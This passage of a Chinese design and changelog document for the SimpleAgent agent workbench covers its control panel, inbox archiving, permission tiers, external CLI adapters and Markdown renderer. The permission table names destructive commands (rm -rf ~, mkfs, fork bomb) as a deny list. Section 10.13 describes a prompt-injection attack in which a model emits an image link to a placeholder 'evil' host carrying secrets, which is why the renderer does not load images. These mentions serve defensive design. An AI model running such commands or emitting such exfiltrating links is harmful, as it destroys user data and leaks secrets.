│ @空间名 下发任务    │ 系统 / 定时 / 邮件         │
│ 任务卡流（状态+摘要）│ ─────────────────────────│
│                   │ 备忘                      │
│ [输入框]           │ 文本条目 / 引用会话的条目   │
└───────────────────┴──────────────────────────┘
```

**指挥台**：输入框解析 `@空间名 [任务描述]`。有任务描述就在该空间**新建 session** 再发消息（定下的口径：总是新建，任务之间不串味；要续聊就点进那个 session 直接问）；只 `@空间名` 就回一张该空间最近 session 的状态卡，不新建。输入 `@` 出候选，↑↓ 选、回车确认。

任务卡是**轮询**出来的（每 3 秒拉一次 `/api/sessions/{id}/summary`），不是 SSE——面板同时可能盯着好几个空间的 session，给每个都开一条 SSE 太重，而摘要本来就是秒级刷新就够。点卡片跳回该 session 的对话视图。
（任务卡后来改成刷新页面也能从后台恢复，不再只有本页下发的，见 10.12。）

**完成摘要**：定下的口径是**纯结构化，不额外调模型**——改了几个文件、工具调用次数、报错条数、验证状态、最后一句助手消息截断 120 字，全是现成数据。控制面板是「看一眼」的地方，为了一句人话去堵一次调用不划算；真想要人话做成卡片上的按需按钮（`panel/summary.py` 的 `one_line()` 就是那一行结论）。

**消息（inbox）**：落 `~/.simpleagent/panel/inbox.jsonl`，**只追加**；已读状态单独记在 `read.json`，不去改已经写出去的行。`source` 是开放字符串，v1 只有 `system` 会真的写东西（session 完成/失败/取消、验证失败，在 `Runner` 的收口处落），`schedule` / `mail` 留给 M4 定时任务和邮件适配器——加新来源不用动数据模型。点未读消息自动标记已读，`ref` 指了 session 就跳过去；右上角「+备忘」把一条消息转成备忘。
（点开外部文本看全文、点开后自动归档、`sa inbox push` 这几件后来补上了，`read.json` 也换成了 `state.json`，见 10.11。
session 完成 / 取消后来不再进消息，只有失败进，见 10.12。）

**备忘（todos）**：全局一份，落 `todos.json`（整体原子写）。条目两种：`text` 纯文本，或 `session` 引用（存 space_id + session_id，点「跳到会话」直接过去）。未完成的在前。

**权限与审批**（M3 的 `Policy`，与「从哪下发」无关，是空间级的同一套）：

| 档 | 工具 | 行为 |
|---|---|---|
| `allow` | `list_dir` / `read_file` / `glob` / `grep` | 直接放行，不问 |
| `ask` | `write_file` / `edit_file` / `bash` | **都要确认**——包括写当前目录 |
| `deny` | `rm -rf ~`、`mkfs`、fork bomb 等 | 直接拒绝，连问都不问（见 `permissions.inspect_command`） |

所以「写当前目录默认打开」不是默认行为：如果没弹审批卡，多半是这个会话里点过**「本次会话始终允许」**（`always_store` 按 session_id 记，跨轮有效）。

**修掉的死锁**：审批帧发出去就过去了，而 SSE 首次连接不重放（`Last-Event-ID` 只在断线重连时带）。于是面板下发的任务一旦卡在审批上，面板只显示「运行中」，**切到那个会话也看不到审批卡**——那一帧早发完了。现在 `PendingApprovals` 除了 Future 还留下 `ApprovalRequest` 本身，`GET /api/approvals` 返回带 `session_id` / `tool_name` / `arguments` 的详情，两处靠它补卡：面板任务卡轮询到 pending 就显示「等待批准」+ 内联允许/始终允许/拒绝；切进会话时也会先拉一次，把错过的审批卡补出来。

**没做的**：定时任务（`source=schedule`）等 M4；邮件（`source=mail`）要接 agent-mail 时得先定「哪些邮件算消息」的筛选规则，单独一轮；知识库入口仍是 M7；`panel/summary` 里的 `today_tokens` 现在是**累计**口径，等 M4 的用量统计再按天切。权限三档目前硬编码在工具声明里，没有按空间配置——某个空间想「写操作免确认」得改代码。

### 10.8 这一版没做

- 「变更 / 文件 / 日志」三个 tab 已实现；审批卡片端到端可用（冒烟里写文件触发审批 → 批准 → 继续）。
- 标题目前是首条用户消息截断 40 字（5.3 的方案 a），没做「调一次便宜模型生成 12 字摘要」（方案 b）。会话的**结构化**摘要另算，见 10.7。
- 会话删除没有接口，左栏只能关闭空间（×），不能删单个会话。
- 验证的完整输出还没落盘（`output_ref` 字段留着没用起来），现在只存截断后的 `output`。

### 10.9 新建空间：目录形态与执行者拆成两维

改造前 `kind` 一个字段扛了两件事：选了「通用任务」就同时锁死「用 tmp」+「内置 loop」，选了
「绑定 agent」又必须填目录；而 `Runner._build_agent()` **根本不看 kind 之外的执行者**，
永远用内置 loop + `config.profiles[space.profile]` 跑——向导里选 claude-code 只是存了个名字，
实际还是 SimpleAgent 在跑。这次把两维拆开：

- `Space.kind` 收敛为**目录形态**（generic 用 tmp / agent 进 `cwd`）；
- 新增 `Space.executor`（`simpleagent` | `claude-code` | `opencode`，默认前者），与 kind 正交；
- `cwd` 从 `[agent]` 段提到顶层——它本来就是空间属性（「在哪跑」），不是 CLI 的启动参数；
- `AgentBinding` 缩成「怎么把 CLI 拉起来」（`command` / `args` / `resume_flag`），去掉
  和顶层重复的 `name`、`cwd`；
- 模型分两栏：`profile`（内置）/ `cli_model`（外部 CLI，`None` = 本机默认，不注入任何 env / args）；
- 校验集中在 `Space.from_spec()`：未知执行者、绑定目录却不给 cwd、通用任务却指定 cwd、
  内置执行者却填 `cli_model`，一律 `ValueError`，API 层转 400。
  `SpaceStore.create_space()` 也改成**先构造再落盘**，非法组合不再留下半个空间目录。
- `_build_agent()` 加了守卫：`executor != simpleagent` 时直接报错
  「执行者 claude-code 还没接入（规划在 M8）」，**不静默回退到内置 loop**。
- 顺带修了一处：`_run_input()` 里「落盘用户消息」挪到构造 Agent **之前**——起不来的时候
  （没配 key、profile 不存在、外部 CLI 没接入）用户刚发的那句话也不会凭空消失。

以前端为准的两处语义：`/api/meta` 多返回 `executors`（含 `label` / `external` / `models`），
向导的模型栏与执行者下拉都从这里渲染，前端不再硬编码 agent 名单；输入区的模型切换在外部
执行者的空间里会禁用（模型由那个 CLI 自己决定），`/model` 命令同理。

**没做的（留给下一步）**：外部 CLI 的启动器本身——spawn `claude -p --output-format stream-json`
→ 解析成我们的事件帧 → resume，以及最要紧的**审批策略**：claude 无头模式的 `--permission-mode`
一开，我们自己的审批卡就形同虚设。`[profiles.*]` 里挂外部 CLI 映射（`ANTHROPIC_*` 那套、
key 仍只写 `api_key_env`）也留到那时一起设计，届时 `cli_model` 才有可选项。

### 10.10 外部 CLI 执行者（claude-code / opencode 真正跑起来了）

上面那段「没做的」做掉了。新增 `src/simpleagent/agents/`：把两家无头模式的 NDJSON
翻译成我们自己的 `Event`，**Runner 之下的东西一行没改**——总线、存储、SSE、前端全都不知道
对面是谁。

```
agents/base.py     CliAdapter 协议 + CliTurn + 权限档（safe / full）
agents/claude.py   claude -p --output-format stream-json --verbose 的事件翻译
agents/opencode.py opencode run --format json 的事件翻译
```

**事件映射**（两家的差异都在适配器里消化掉了）：

| 我们的帧 | claude | opencode |
|---|---|---|
| 记 `agent_session_id` | `system/init` 的 `session_id` | 任意事件的 `sessionID` |
| `text_delta` | `stream_event` 增量块（`--include-partial-messages`）；没有增量时用 `assistant` 整段 | `text` 事件的 `part.text` |
| `reasoning_delta` | `assistant` 里的 `thinking` 块 | 无（`--thinking` 才输出，暂未接） |
| `tool_call_start` | `assistant` 里的 `tool_use` 块 | `tool_use` 事件（`part.tool` + `state.input`） |
| `tool_result` | 藏在 **`user` 消息**里的 `tool_result` 块 | 同一个 `tool_use` 事件的 `state.output`（`status=completed`） |
| `message_done` + usage | `result` 事件（`usage` + `total_cost_usd`） | `step_finish`（**增量** token / cost，要自己累加） |

**几条实测踩出来的规则**（都有样本兜着，见 `tests/fixtures/cli/`）：

1. claude 的 `result.subtype` 是 `"success"` 时 `is_error` 也可能是 `true`（没登录就是），
   **成败只能看 `is_error`**。
2. claude 的 `--output-format stream-json` **必须**配 `--verbose`，否则硬报错。
3. opencode 的 token / cost 是**本步增量**，`tokens.cache.read` 要算进 prompt tokens。
4. opencode 的退出码不可靠，成败看事件；`run [message..]` 是变长参数，prompt 前要加 `--`。
5. 取消要**杀整个进程组**：CLI 会自己 fork（opencode 每次都起一个本地 server），
   只 terminate 父进程的话子进程还攥着 stdout，取消像没生效。

**权限档**（`Space.permission`，只在外部执行者上有意义，默认 `safe`）：

| 档 | claude | opencode | 效果 |
|---|---|---|---|
| `safe`（默认） | `--tools Read,Glob,Grep --permission-mode dontAsk --permission-prompts none` | `OPENCODE_CONFIG_CONTENT` 注入 `permission: {"*": "deny", read/glob/grep/lsp: "allow"}` | 能看不能改，且**不会挂住等人** |
| `full` | `--dangerously-skip-permissions` | `--auto` | 想干什么干什么；左栏卡片会挂一个红色的「全放行」标记 |

选 safe 是因为两家的无头模式都没法把「要不要批准」实时问回给我们（claude 得走
`--permission-prompt-tool` 外接一个 MCP server，opencode 只能预置 allow/deny），
所以 v1 只能预先定档。**真正的实时审批**留到接了 MCP 之后。

**还没有的**：claude 那条只有失败路径是实测过的（本机 claude 没登录，`Not logged in`），
`stream_event` 增量块和工具块的事件形状是照文档写的，登录后要补一份成功样本重录；
`cli_model` 现在只是透传给 `--model` / `-m` 的字符串，「用我们 config.toml 里的 profile
跑 claude / opencode」（注入 `ANTHROPIC_BASE_URL` 那套）还没做。

### 10.11 控制面板消息：详情、归档与外部投递

W5 的消息只是「系统事件流水」：外部发来的纯文本点了没反应、正文在列表里原样铺开，
看过的和没看过的堆在一起，外部来源必须等 `sa serve` 在跑才能投。这一轮把它做成中控：
**例行任务 / 脚本投结论进来 → 左栏角标提醒 → 点开（会话跳转 / 文本看全文）→ 点开 30 分钟后自动移进归档**。

**归档是算出来的，不是搬过去的。** 每条消息只多记两个时间，放在 `panel/state.json`：

```json
{"ms_1726..._a1b2c3": {"read_at": "2026-09-18T10:00:00.000+08:00", "archived_at": null}}
```

```
archive_at = archived_at or read_at + archive_after     # 没点开过 → 永不自动归档
archived   = now >= archive_at
```

- 不把消息挪到另一个文件：那要改写 `inbox.jsonl`，破坏「只追加」，还会和正在追加的外部进程打架；
- 没有后台定时器：服务没开的那段时间不会漏，任何时候读出来都对；
- `[panel] archive_after_minutes`（默认 30）改了对老消息立即生效；
- 不在前端 `setTimeout` 到点隐藏：状态必须在 Python 侧，刷新页面、换个客户端都一致。

推论：「全部已读」= 全部点过，到点一起进归档；手动归档顺带补 `read_at`（归档的一定算看过），
所以未读数只数 `read_at` 为空的。W5 的 `read.json` 只有 id、没有时间，第一次读 `state.json`
不存在时迁移过来，`read_at` 取 `read.json` 的 mtime——多半早过了时限，升级后老消息直接进归档。

**点开之后做什么由 `ref` 推出**（`action` 字段，服务端算，不进数据模型）：`ref` 里有
`space_id` + `session_id` → `session`，其它都是 `text`。

| action | 点击 | 兜底 |
|---|---|---|
| `session` | 记已读 → 跳到那个会话 | 会话已不存在（空间被删）→ 退回弹层看原文，顶部提示 |
| `text` | 记已读 → 弹层看全文（`renderText`：先转义再渲染代码块） | — |

弹层底部：复制 / +备忘 / 归档 / 打开链接（仅 `ref.url` 是 http(s) 时出现，`javascript:` 这类
外部投进来的链接不给按钮）/ 关闭；Esc、点遮罩都能关。「+备忘」按 action 建 `session` 或 `text`
备忘（W5 一律建成 `session`，外部文本转过去会出现一个点了没反应的「跳到会话」）。

**列表与全文分开取**：`GET /api/inbox` 的条目只带 `preview`（去换行、截 200 字），全文走
`GET /api/inbox/{id}`。外部报告可能很长，归档一次拉 200 条不该把全文都带上。正文入库时封顶
64 000 字，超出截断并注明原长度——例行任务的结论不该因为太长整条丢掉。

**外部投递**：`sa inbox push` 直接追加 `inbox.jsonl`，不需要 serve 在跑：

```bash
uv run pytest 2>&1 | sa inbox push -t "夜间测试" --level warn --source schedule
sa inbox push -t "备份完成" -b "NAS 增量备份 12.3 GB"
```

没给 `-b` 且 stdin 是管道时自动读 stdin（`-b -` 强制读）；终端里直接敲不会卡在等输入上。
两个进程同时追加时，每条用一次 `os.write`（`O_APPEND`）写出整行，不走带缓冲的文件对象
（缓冲会把长行拆成几次写，两边内容可能交错）；读的一侧遇到半行直接跳过，下次读就完整了。
`state.json` 只有服务端写，读-改-写用一把锁串起来（HTTP 层是多线程的）。

**刷新**：一个 30 秒的钟——面板开着时连列表带统计一起刷（到期的消息刷一下就自然挪进归档），
没开只拉 `/api/inbox/count` 刷左栏角标；后台标签页跳过，切回前台补一次。角标不复用
`/api/panel/summary`，因为那个要遍历所有空间的 session，不适合 30 秒一次。
面板每次打开都回到「当前」，归档是要找东西时才去翻的；归档视图按归档时间倒序，刚被归档的在最上面。

**没做的**：从归档恢复 / 「保留」不自动归档 / 归档搜索（先看用得上不）；`inbox.jsonl` 按月轮转
（现在每次都整文件读，几千条以内无感）；新消息的系统通知留给 M4 的 `notify`。

### 10.12 任务终态分流：消息只放失败，指挥台显示当前状态

W5 起每个 session 跑完都往消息里落一条（完成 / 失败 / 取消各一条）。可指挥台的任务卡本来就会
轮询到「完成 · 改了 2 个文件 · 验证通过」，结果每跑完一个任务，消息里就多一条重复的未读，
左栏角标 +1，真正失败的那条反而被淹掉。定下的口径：

**消息只放要你去处理的事，指挥台显示任务的当前状态。** 按级别分流，门槛是 `runner.py` 里的
`INBOX_LEVELS`（现在只有 `error`）：

| 终态 | 级别 | 进消息 | 在哪看 |
|---|---|---|---|
| done | success | ✗ | 指挥台卡片（完成 · 摘要） |
| cancelled | warn | ✗（取消是自己点的，不用再提醒一遍） | 指挥台卡片 |
| error | error | ✓，正文直接写失败原因 | 消息 + 指挥台 |
| 验证未通过 | error | ✓（不变） | 消息 |

规则对所有 session 生效，不区分是不是从指挥台 @ 下发的：后端不需要知道任务从哪来，
在对话视图里跑的任务你本来就看着，也用不着一条「完成」。

**失败原因跟着收口走。** `_finalize(reason=...)` 把原因同时放进 status 帧和消息正文：
内置 loop 的异常文案、外部 CLI 的报错（`_run_cli` 改成返回 `(status, reason)`，带上
「Not logged in」、退出码 + stderr 末尾这类信息）。之前正文只有一句「去日志 tab 看原因」。
顺带补了一个漏洞：**启动失败**（没配 key、profile 不存在）那段原来自己落盘、自己发帧，
绕开了 `_finalize`，最该提醒的失败反而一条消息都没有；现在也走收口点。

**指挥台从后台恢复任务卡。** 完成不进消息之后，指挥台就是看它的唯一地方，卡片不能只活在
页面内存里（`panelState.dispatch`）、一刷新就没了。`/api/panel/summary` 早就返回了
`running` + `recent`（24 小时内的终态，最多 10 条），前端打开面板和每次刷新统计时用它把
缺的卡片补进来，各拉一次 `/api/sessions/{id}/summary` 拿摘要，运行中的之后照常交给 3 秒轮询。
补回来的包括在对话视图里跑的 session——指挥台现在是「近期所有任务的状态」，和「消息只放
失败」正好互补。后台只记了 `updated_at`，不知道运行中的那一轮从哪一刻开始，所以恢复出来的
运行中卡片不显示已用时。卡片第二行的终态写明「完成 / 已取消 / 出错」再接摘要，不只靠左边的色带。

**没做的**：门槛没做成配置项（要改只改 `INBOX_LEVELS` 一处，等 M4 定时任务有了「成功也要通知」
的需求再说）；指挥台卡片没有「清掉」按钮，超过 24 小时的下次刷新页面自然不再恢复。

### 10.13 对话里模型回复的 Markdown 渲染

原来的 `renderText` 只认代码块和行内代码，气泡又是 `white-space: pre-wrap`，模型写的标题、
列表、表格、加粗都原样显示成符号。现在助手气泡改用 `web/markdown.js` 的 `renderMarkdown`，
在 `app.js` 之前加载，挂在 `window` 上。用户气泡仍是纯文本；控制面板的消息弹层仍用 `renderText`
——那里是失败原因、stderr，以 `#` 开头的行不该变成标题。

**为什么手写，不引库。** marked 本身不清洗 HTML，要配 DOMPurify，两个库合计约 60KB，还违反 10.4
的零依赖、零构建；CDN 断网不能用，每次打开还会请求外部服务器；服务端渲染要加 Python 依赖，
而且流式增量是在浏览器里拼的。手写大约 300 行，覆盖模型常用的写法就够了。

**两段式：先分块，再逐块转义 + 行内格式。** 原来是整段先转义再用正则替换，转义后引用开头的
`>` 已经是 `&gt;`，块结构就认不出来了。现在对原始文本按行分块（围栏代码 / 标题 / 分隔线 / 引用 /
列表 / 表格 / 段落），块内文本交给 `renderInline`。安全上只守一条：**原文的每个字符都恰好经过一次
`escapeHtml` 才进 HTML，标签只由渲染器生成**。唯一放行的原始标签是 `<br>`（模型爱在表格单元格里
用它换行），输出是固定的 `<br>`，带属性的写法照样转义。

**行内：先把不能再加工的片段换成占位符。** 行内代码、反斜杠转义、链接先换成 `\x00序号\x00`
存进数组，剩下的文本整体转义后再做粗体 / 斜体 / 删除线，最后换回去。所以代码里的 `**`
不会变粗体，网址里的 `_` 不会变斜体。链接文字在同一个数组里就地格式化，里面的 `` `code` `` 也能正常显示。

**链接和图片。**
- 只有 `http(s)` 链接可点，新标签页打开 + `noopener noreferrer`。`javascript:`、相对路径只显示文字，
  悬停看目标——相对路径点了会把整个工作台页面跳走。
- **图片不加载**，只渲染成「图片：alt」的链接。这是 agent 场景的已知攻击：网页或文件里的 prompt
  injection 诱导模型输出 `![](https://evil/?q=<机密>)`，浏览器一渲染就把数据发出去，不需要任何人点。
- 裸网址自动变链接，只认 ASCII 字符（中文紧跟在网址后面不会被吞进去），末尾的句号、逗号和多出来的
  右括号留在链接外。

**几个口径。**
- 段落里的单个换行显示为 `<br>`（GitHub 评论的做法）。CommonMark 会合并成空格，中文里很别扭。
- 列表按「比列表标记缩进更深的行都归当前项」切分，去掉内容缩进后递归渲染，嵌套列表、项里的代码块
  都自然成立；`1.` 下面只缩 2 格的子列表也认。项之间或项内有空行是松散列表（段落包 `<p>`），
  否则紧凑（不包，免得每项都撑出段间距）。列表可以直接打断段落（「步骤：」下一行就是 `1.`）。
- 不支持：setext 标题、4 空格缩进代码块（和嵌套列表冲突）、引用式链接、`__粗体__`
  （会把 `__init__.py` 渲染坏；`_斜体_` 要求两侧不是字母数字，`snake_case` 不受影响）。

**流式。** 每个 `text_delta` 仍然整段重新渲染（和原来一样，几 KB 的回复开销可以忽略）。没闭合的
围栏按代码块延伸到末尾，末尾多出的空行去掉，免得代码块写到一半时先按普通文本闪一下。光标由
`placeCursor` 插到最后一个块的末尾（段落、列表项、代码块里），不另起一行；`finishAssistantBubble`
统一做收尾渲染去掉光标——外部 CLI 执行者不一定先发 `message_done` 再发工具调用。

**测试。** `tests/serve/test_markdown.py` 用 node 直接跑 `markdown.js`（`module.exports` 导出），
在 Python 里断言 HTML；没装 node 就整体跳过，不为测试引入 npm。覆盖块级结构、误渲染
（`__init__.py`、`2 * 3 * 4`）、各个位置的 HTML 注入、`javascript:` 链接、图片不加载。

**没做的**：代码块的语言标注和复制按钮、数学公式、流式渲染的节流（回复很长时再说）。

### 10.14 指挥台调度：一句任务自动派给空间

指挥台不以 `@` 开头的输入交给调度者：保留空间 `sp_command`（左栏不显示）里的一个内置 loop 会话，
只有 `propose_plan` / `dispatch` 两个工具，按空间简介挑空间派发，子任务是目标空间里的普通会话
（meta 记 `parent_session_id`），面板上缩进挂在调度者卡片下面、左栏带「派」标记。跨空间先出计划卡，
确认后才执行（代码层面强制，计划卡没有「始终允许」）。`@空间名 任务` 保持原来的直接下发。
空间设置新增「简介」栏，可让模型自动摘要 50～100 字（只填进文本框，不自动保存）。

顺带修了一个老 bug：页面在后台时打开会话、切回前台续传会带 `last_event_id=0`，把整段历史的帧重放一遍；
现在 `GET /api/sessions/{id}` 带上 `seq`，前端只订阅它之后的帧。

方案、取舍、改动清单和验证记录见 [command-dispatch.md](command-dispatch.md)。
